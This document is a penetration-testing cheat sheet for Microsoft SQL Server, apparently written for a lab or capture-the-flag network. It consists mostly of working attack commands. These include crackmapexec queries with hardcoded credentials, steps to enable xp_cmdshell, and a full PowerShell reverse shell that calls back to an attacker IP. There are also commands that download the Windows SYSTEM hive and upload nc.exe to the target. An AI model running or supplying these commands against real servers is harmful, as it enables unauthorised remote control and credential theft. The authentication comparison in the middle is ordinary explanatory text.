### Show all databases
proxychains4 -f /etc/proxychains4.conf crackmapexec mssql 10.10.124.142 -u web_svc -p Diamond1 -q 'SELECT name FROM master.sys.databases;'
SELECT name FROM sys.databases;

### Show all tables from msdb database
proxychains4 -f /etc/proxychains4.conf crackmapexec mssql 10.10.124.142 -u web_svc -p Diamond1 -q 'SELECT name FROM msdb.sys.tables'
SELECT * FROM database_name.information_schema.tables;

### show all values of tablename from database_name
select * from database_name.dbo.table_name;

### Enable command execution
```
enable_xp_cmdshell;
```
```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Mssql Connection and Get Reverse Sehll
```
impacket-mssqlclient user:pass@IP
impacket-mssqlclient user:pass@IP -windows-auth

EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.77.153'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```

### Sql authentication vs Windows authentication
>SQL Server Authentication:

>User Credentials: Requires a username and password specific to the SQL Server database.
Authentication Process: The SQL Server validates the username and password provided by the user.
Security Implications: Typically involves storing a username and password in the application's connection string. This method is more vulnerable to security threats if credentials are not adequately protected.
Example connection string using SQL Server Authentication:

>Windows Authentication:

>User Credentials: Relies on the user's Windows credentials (username and password) without requiring a separate SQL Server username and password.
Authentication Process: The SQL Server trusts the Windows authentication process, and the user is authenticated based on their Windows login credentials.
Security Implications: Generally considered more secure as it leverages the security features of the Windows operating system. Credentials are not typically stored in connection strings.

### MSSQL Upload and Download Files
```
proxychains4 -f /etc/proxychains4.conf crackmapexec mssql 10.10.133.148 -u sql_svc -p Dolphin1 --get-file C:\\windows.old\\Windows\\System32\\SYSTEM /home/kali/Desktop/SYSTEM
proxychains4 -f /etc/proxychains4.conf crackmapexec mssql 10.10.133.148 -u sql_svc -p Dolphin1 --put-file nc.exe C:\\Users\\Public\\nc.exe
```
